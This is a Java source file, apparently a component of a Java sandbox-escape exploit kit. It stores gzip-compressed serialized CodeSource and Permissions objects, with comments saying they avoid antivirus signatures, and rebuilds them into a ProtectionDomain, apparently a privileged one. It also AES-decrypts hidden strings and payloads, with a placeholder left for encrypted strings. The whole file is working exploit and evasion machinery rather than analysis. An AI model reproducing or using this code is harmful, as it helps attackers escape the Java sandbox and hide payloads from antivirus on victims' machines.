import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;

public class B {
	static byte[] strs = {
// ENC_STRINGS
	};
	static byte[] as = {
			(byte) 0x1f,
			(byte) 0x8b, (byte) 0x08, (byte) 0x00, (byte) 0x00, (byte) 0x00,
			(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x5b,
			(byte) 0xf3, (byte) 0x96, (byte) 0x81, (byte) 0xb5, (byte) 0xb4,
			(byte) 0x88, (byte) 0x41, (byte) 0x38, (byte) 0xda, (byte) 0x27,
			(byte) 0x2b, (byte) 0xb1, (byte) 0x2c, (byte) 0x51, (byte) 0x2f,
			(byte) 0x27, (byte) 0x31, (byte) 0x2f, (byte) 0x5d, (byte) 0xcf,
			(byte) 0x3f, (byte) 0x29, (byte) 0x2b, (byte) 0x35, (byte) 0xb9,
			(byte) 0xc4, (byte) 0x7a, (byte) 0xc2, (byte) 0xb9, (byte) 0x88,
			(byte) 0xf9, (byte) 0x02, (byte) 0xc5, (byte) 0x9a, (byte) 0x39,
			(byte) 0x4c, (byte) 0x0c, (byte) 0x0c, (byte) 0x15, (byte) 0x05,
			(byte) 0x0c, (byte) 0x0c, (byte) 0x0c, (byte) 0x4c, (byte) 0xc5,
			(byte) 0x45, (byte) 0x0c, (byte) 0x06, (byte) 0x60, (byte) 0x55,
			(byte) 0xa5, (byte) 0x25, (byte) 0x99, (byte) 0x39, (byte) 0x7a,
			(byte) 0xc9, (byte) 0xf9, (byte) 0x79, (byte) 0xc9, (byte) 0xa5,
			(byte) 0x45, (byte) 0x45, (byte) 0xa9, (byte) 0x79, (byte) 0x25,
			(byte) 0x7a, (byte) 0x89, (byte) 0x25, (byte) 0xf9, (byte) 0xb9,
			(byte) 0x99, (byte) 0xc9, (byte) 0x7a, (byte) 0x8e, (byte) 0x60,
			(byte) 0x2a, (byte) 0x28, (byte) 0x35, (byte) 0x2d, (byte) 0x15,
			(byte) 0x28, (byte) 0x9a, (byte) 0x9c, (byte) 0xea, (byte) 0x58,
			(byte) 0x54, (byte) 0x94, (byte) 0x58, (byte) 0xb9, (byte) 0xf2,
			(byte) 0xd2, (byte) 0xbd, (byte) 0x85, (byte) 0xfb, (byte) 0x52,
			(byte) 0x13, (byte) 0x78, (byte) 0x98, (byte) 0x18, (byte) 0x18,
			(byte) 0xa3, (byte) 0x19, (byte) 0x58, (byte) 0x13, (byte) 0x41,
			(byte) 0x42, (byte) 0x25, (byte) 0x58, (byte) 0x6d, (byte) 0xab,
			(byte) 0x28, (byte) 0x00, (byte) 0x3a, (byte) 0x83, (byte) 0x3b,
			(byte) 0xda, (byte) 0xc7, (byte) 0xb7, (byte) 0xd2, (byte) 0x27,
			(byte) 0x3f, (byte) 0x31, (byte) 0x25, (byte) 0xb5, (byte) 0xc8,
			(byte) 0xfa, (byte) 0xd8, (byte) 0xa2, (byte) 0xce, (byte) 0xec,
			(byte) 0xd3, (byte) 0x05, (byte) 0xdb, (byte) 0x44, (byte) 0x61,
			(byte) 0xd6, (byte) 0x33, (byte) 0x16, (byte) 0x14, (byte) 0x32,
			(byte) 0xd4, (byte) 0x31, (byte) 0xb0, (byte) 0x01, (byte) 0x00,
			(byte) 0x29, (byte) 0x89, (byte) 0xd7, (byte) 0xdf, (byte) 0xb1,
			(byte) 0x00, (byte) 0x00, (byte) 0x00
	};

	static byte[] cs = { // Serialized CodeSource (Avoids AV code signature for now)
			(byte) 0x1f,
			(byte) 0x8b, (byte) 0x08, (byte) 0x00, (byte) 0x00, (byte) 0x00,
			(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x2d,
			(byte) 0x8d, (byte) 0x31, (byte) 0xaa, (byte) 0xc2, (byte) 0x40,
			(byte) 0x14, (byte) 0x45, (byte) 0xaf, (byte) 0x24, (byte) 0x6a,
			(byte) 0x04, (byte) 0xb1, (byte) 0xf8, (byte) 0x36, (byte) 0x62,
			(byte) 0x6f, (byte) 0x9b, (byte) 0x74, (byte) 0x5a, (byte) 0x58,
			(byte) 0x8a, (byte) 0x85, (byte) 0x30, (byte) 0x95, (byte) 0x22,
			(byte) 0xd8, (byte) 0x0e, (byte) 0x71, (byte) 0x34, (byte) 0x91,
			(byte) 0x90, (byte) 0x37, (byte) 0x4e, (byte) 0x5e, (byte) 0x34,
			(byte) 0x36, (byte) 0xdf, (byte) 0x5d, (byte) 0xb8, (byte) 0x0a,
			(byte) 0x57, (byte) 0x61, (byte) 0xe3, (byte) 0x46, (byte) 0x6c,
			(byte) 0x2c, (byte) 0xfe, (byte) 0x0e, (byte) 0x3e, (byte) 0xe8,
			(byte) 0x44, (byte) 0x73, (byte) 0xab, (byte) 0xfb, (byte) 0x0e,
			(byte) 0xdc, (byte) 0xf3, (byte) 0xae, (byte) 0x7f, (byte) 0xa8,
			(byte) 0x67, (byte) 0x06, (byte) 0xbd, (byte) 0x9d, (byte) 0x3c,
			(byte) 0x48, (byte) 0x3f, (byte) 0x53, (byte) 0x61, (byte) 0x6e,
			(byte) 0x62, (byte) 0x3e, (byte) 0xf9, (byte) 0x13, (byte) 0x5a,
			(byte) 0xab, (byte) 0x05, (byte) 0xe5, (byte) 0x26, (byte) 0x54,
			(byte) 0xd3, (byte) 0xee, (byte) 0xfd, (byte) 0x79, (byte) 0x9b,
			(byte) 0xaf, (byte) 0xce, (byte) 0x0e, (byte) 0x6a, (byte) 0x02,
			(byte) 0x5e, (byte) 0x42, (byte) 0xa1, (byte) 0xe4, (byte) 0x98,
			(byte) 0x52, (byte) 0x46, (byte) 0x47, (byte) 0x94, (byte) 0x8b,
			(byte) 0x20, (byte) 0x55, (byte) 0x1c, (byte) 0x2c, (byte) 0xe7,
			(byte) 0x62, (byte) 0x5c, (byte) 0x68, (byte) 0x2b, (byte) 0x69,
			(byte) 0x7f, (byte) 0x24, (byte) 0x16, (byte) 0xf9, (byte) 0x16,
			(byte) 0x5d, (byte) 0x06, (byte) 0xa3, (byte) 0x61, (byte) 0xff,
			(byte) 0xff, (byte) 0x61, (byte) 0x1c, (byte) 0x34, (byte) 0x67,
			(byte) 0xf0, (byte) 0x22, (byte) 0x99, (byte) 0x45, (byte) 0xa5,
			(byte) 0x74, (byte) 0x06, (byte) 0x57, (byte) 0x93, (byte) 0x61,
			(byte) 0x81, (byte) 0x96, (byte) 0xcc, (byte) 0x39, (byte) 0xa2,
			(byte) 0xf2, (byte) 0x19, (byte) 0xe3, (byte) 0xe7, (byte) 0xeb,
			(byte) 0x4a, (byte) 0x64, (byte) 0xba, (byte) 0x0d, (byte) 0x16,
			(byte) 0x6c, (byte) 0xe2, (byte) 0x74, (byte) 0x3b, (byte) 0x16,
			(byte) 0x70, (byte) 0x37, (byte) 0x71, (byte) 0xa2, (byte) 0xf6,
			(byte) 0xf8, (byte) 0x85, (byte) 0x6b, (byte) 0x7b, (byte) 0x44,
			(byte) 0x19, (byte) 0x57, (byte) 0xdd, (byte) 0xd3, (byte) 0x86,
			(byte) 0x98, (byte) 0x42, (byte) 0x4a, (byte) 0xaa, (byte) 0xdb,
			(byte) 0x31, (byte) 0x6a, (byte) 0xf3, (byte) 0xa9, (byte) 0x85,
			(byte) 0x7e, (byte) 0x55, (byte) 0x61, (byte) 0x80, (byte) 0x51,
			(byte) 0x0b, (byte) 0x4a, (byte) 0xda, (byte) 0xe0, (byte) 0xaf,
			(byte) 0x48, (byte) 0x17, (byte) 0x47, (byte) 0x17, (byte) 0x36,
			(byte) 0xc5, (byte) 0x1b, (byte) 0xb5, (byte) 0x17, (byte) 0x3e,
			(byte) 0x24, (byte) 0xf0, (byte) 0x00, (byte) 0x00, (byte) 0x00

	};

	static byte[] perm = { // Serialized Permission (Avoids AV code signature for now)
			(byte) 0x1f,
			(byte) 0x8b, (byte) 0x08, (byte) 0x00, (byte) 0x00, (byte) 0x00,
			(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x5b,
			(byte) 0xf3, (byte) 0x96, (byte) 0x81, (byte) 0xb5, (byte) 0xb8,
			(byte) 0x88, (byte) 0x41, (byte) 0x32, (byte) 0x2b, (byte) 0xb1,
			(byte) 0x2c, (byte) 0x51, (byte) 0xaf, (byte) 0x38, (byte) 0x35,
			(byte) 0xb9, (byte) 0xb4, (byte) 0x28, (byte) 0xb3, (byte) 0xa4,
			(byte) 0x52, (byte) 0x2f, (byte) 0x20, (byte) 0xb5, (byte) 0x28,
			(byte) 0x37, (byte) 0xb3, (byte) 0xb8, (byte) 0x38, (byte) 0x33,
			(byte) 0x3f, (byte) 0xaf, (byte) 0xd8, (byte) 0x39, (byte) 0xd7,
			(byte) 0xdb, (byte) 0xf7, (byte) 0xd2, (byte) 0x09, (byte) 0xfe,
			(byte) 0x00, (byte) 0x66, (byte) 0x06, (byte) 0x26, (byte) 0x1f,
			(byte) 0x06, (byte) 0xde, (byte) 0xc4, (byte) 0x9c, (byte) 0x1c,
			(byte) 0x84, (byte) 0x5c, (byte) 0x09, (byte) 0x83, (byte) 0x8a,
			(byte) 0x0f, (byte) 0x48, (byte) 0x9f, (byte) 0x3e, (byte) 0x4c,
			(byte) 0x9f, (byte) 0x3e, (byte) 0x42, (byte) 0xce, (byte) 0x39,
			(byte) 0x3f, (byte) 0x27, (byte) 0x27, (byte) 0x35, (byte) 0xb9,
			(byte) 0x04, (byte) 0xc8, (byte) 0xb2, (byte) 0xf6, (byte) 0x61,
			(byte) 0x60, (byte) 0x2d, (byte) 0x00, (byte) 0x8a, (byte) 0x17,
			(byte) 0x97, (byte) 0x30, (byte) 0x88, (byte) 0x42, (byte) 0x94,
			(byte) 0x97, (byte) 0x96, (byte) 0x64, (byte) 0xe6, (byte) 0xe8,
			(byte) 0x7b, (byte) 0x24, (byte) 0x16, (byte) 0x67, (byte) 0x94,
			(byte) 0x24, (byte) 0x26, (byte) 0xe5, (byte) 0xa4, (byte) 0x5a,
			(byte) 0x57, (byte) 0x14, (byte) 0x31, (byte) 0x28, (byte) 0xe1,
			(byte) 0xb2, (byte) 0x1e, (byte) 0x61, (byte) 0xcc, (byte) 0xa2,
			(byte) 0x25, (byte) 0xb7, (byte) 0xae, (byte) 0x65, (byte) 0x49,
			(byte) 0x70, (byte) 0x6a, (byte) 0x32, (byte) 0x31, (byte) 0x30,
			(byte) 0x46, (byte) 0x31, (byte) 0x70, (byte) 0x14, (byte) 0xa5,
			(byte) 0x26, (byte) 0xa6, (byte) 0xf8, (byte) 0xe7, (byte) 0xe5,
			(byte) 0x54, (byte) 0x56, (byte) 0x14, (byte) 0x30, (byte) 0x00,
			(byte) 0x5d, (byte) 0xaf, (byte) 0x8a, (byte) 0xaa, (byte) 0xdd,
			(byte) 0x11, (byte) 0xd9, (byte) 0x91, (byte) 0x08, (byte) 0x13,
			(byte) 0x4e, (byte) 0x68, (byte) 0xec, (byte) 0x5f, (byte) 0xfc,
			(byte) 0xfc, (byte) 0xb0, (byte) 0xc6, (byte) 0x2f, (byte) 0xb0,
			(byte) 0x09, (byte) 0xdc, (byte) 0x40, (byte) 0x9f, (byte) 0xc4,
			(byte) 0x03, (byte) 0x71, (byte) 0x7e, (byte) 0x79, (byte) 0x6a,
			(byte) 0x4a, (byte) 0x45, (byte) 0x21, (byte) 0x43, (byte) 0x1d,
			(byte) 0x03, (byte) 0x33, (byte) 0x03, (byte) 0x23, (byte) 0xd0,
			(byte) 0x24, (byte) 0x61, (byte) 0xb0, (byte) 0x49, (byte) 0x20,
			(byte) 0x07, (byte) 0xea, (byte) 0xc1, (byte) 0x1d, (byte) 0x28,
			(byte) 0xbc, (byte) 0x9b, (byte) 0x5f, (byte) 0x55, (byte) 0xd1,
			(byte) 0xeb, (byte) 0xc9, (byte) 0x0e, (byte) 0x60, (byte) 0x08,
			(byte) 0xb8, (byte) 0x31, (byte) 0x70, (byte) 0xe5, (byte) 0xe4,
			(byte) 0x27, (byte) 0xa6, (byte) 0xb8, (byte) 0x25, (byte) 0x26,
			(byte) 0x97, (byte) 0xe4, (byte) 0x17, (byte) 0x79, (byte) 0x32,
			(byte) 0x70, (byte) 0x96, (byte) 0x64, (byte) 0x14, (byte) 0xa5,
			(byte) 0x16, (byte) 0x67, (byte) 0xe4, (byte) 0xe7, (byte) 0xa4,
			(byte) 0x54, (byte) 0x14, (byte) 0xd8, (byte) 0x3b, (byte) 0x30,
			(byte) 0x80, (byte) 0x00, (byte) 0x63, (byte) 0x39, (byte) 0x07,
			(byte) 0x90, (byte) 0x64, (byte) 0x02, (byte) 0xb1, (byte) 0xca,
			(byte) 0x8a, (byte) 0x18, (byte) 0xa4, (byte) 0xf1, (byte) 0x38,
			(byte) 0xec, (byte) 0x7a, (byte) 0xdb, (byte) 0xcc, (byte) 0x2b,
			(byte) 0x21, (byte) 0xfa, (byte) 0x0e, (byte) 0x47, (byte) 0x81,
			(byte) 0x6a, (byte) 0x81, (byte) 0x21, (byte) 0x20, (byte) 0x81,
			(byte) 0x2b, (byte) 0x04, (byte) 0x36, (byte) 0x1e, (byte) 0x7b,
			(byte) 0x68, (byte) 0xaf, (byte) 0x11, (byte) 0x1e, (byte) 0x58,
			(byte) 0x07, (byte) 0x74, (byte) 0xb5, (byte) 0x0f, (byte) 0x03,
			(byte) 0x4b, (byte) 0x5e, (byte) 0x62, (byte) 0x6e, (byte) 0x6a,
			(byte) 0x09, (byte) 0x83, (byte) 0x10, (byte) 0x24, (byte) 0x1c,
			(byte) 0x73, (byte) 0x12, (byte) 0xf3, (byte) 0xd2, (byte) 0xf5,
			(byte) 0x83, (byte) 0x4b, (byte) 0x8a, (byte) 0x32, (byte) 0xf3,
			(byte) 0xd2, (byte) 0xad, (byte) 0x2b, (byte) 0x0a, (byte) 0x40,
			(byte) 0x9e, (byte) 0x60, (byte) 0xab, (byte) 0xa8, (byte) 0x00,
			(byte) 0x00, (byte) 0x28, (byte) 0xb4, (byte) 0x94, (byte) 0x99,
			(byte) 0xd1, (byte) 0x01, (byte) 0x00, (byte) 0x00
	};

	public byte[] uas;
	public byte[] ucs;
	public byte[] uperm;
	public String[] ustr;
	Key decrKey;

	public B(byte[] key, Integer key_size) throws Exception {
		uas = new byte[177];
		ucs = new byte[240];
		uperm = new byte[465];
		byte[] ukey = new byte[key_size];

		GZIPInputStream a = new GZIPInputStream(new ByteArrayInputStream(as));
		GZIPInputStream b = new GZIPInputStream(new ByteArrayInputStream(cs));
		GZIPInputStream c = new GZIPInputStream(new ByteArrayInputStream(perm));
		GZIPInputStream d = new GZIPInputStream(new ByteArrayInputStream(key));

		a.read(uas, 0, 177);
		b.read(ucs, 0, 240);
		c.read(uperm, 0, 465);
		d.read(ukey, 0, key_size);

		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(ukey));
		decrKey = (Key) ois.readObject();
		byte[] ustrs = decrypt(strs);
		ois = new ObjectInputStream(new ByteArrayInputStream(ustrs));
		ustr = (String[]) ois.readObject();
	}

	public ProtectionDomain getPD() throws Exception {
		ObjectInputStream o = new ObjectInputStream(new ByteArrayInputStream(ucs));
		ObjectInputStream o2 = new ObjectInputStream(new ByteArrayInputStream(uperm));
		ProtectionDomain pd = new ProtectionDomain((CodeSource) o.readObject(),
				(Permissions) o2.readObject());

		return pd;
	}

	public ProtectionDomain[] getPDA() throws Exception {
		return new ProtectionDomain[] { getPD() };
	}

	public byte[] uncomp(byte[] org, int size) throws Exception {
		byte[] out = new byte[size];
		GZIPInputStream a = new GZIPInputStream(new ByteArrayInputStream(decrypt(org)));

		int b = a.read();
		int pos = 0;

		while (b != -1) {
			out[pos] = (byte) b;
			pos += 1;
			b = a.read();
		}

		return out;
	}

	public byte[] decrypt(byte[] encryptedValue) throws Exception {
		Cipher c = Cipher.getInstance("AES");
		c.init(Cipher.DECRYPT_MODE, decrKey);
		return c.doFinal(encryptedValue);
	}

}
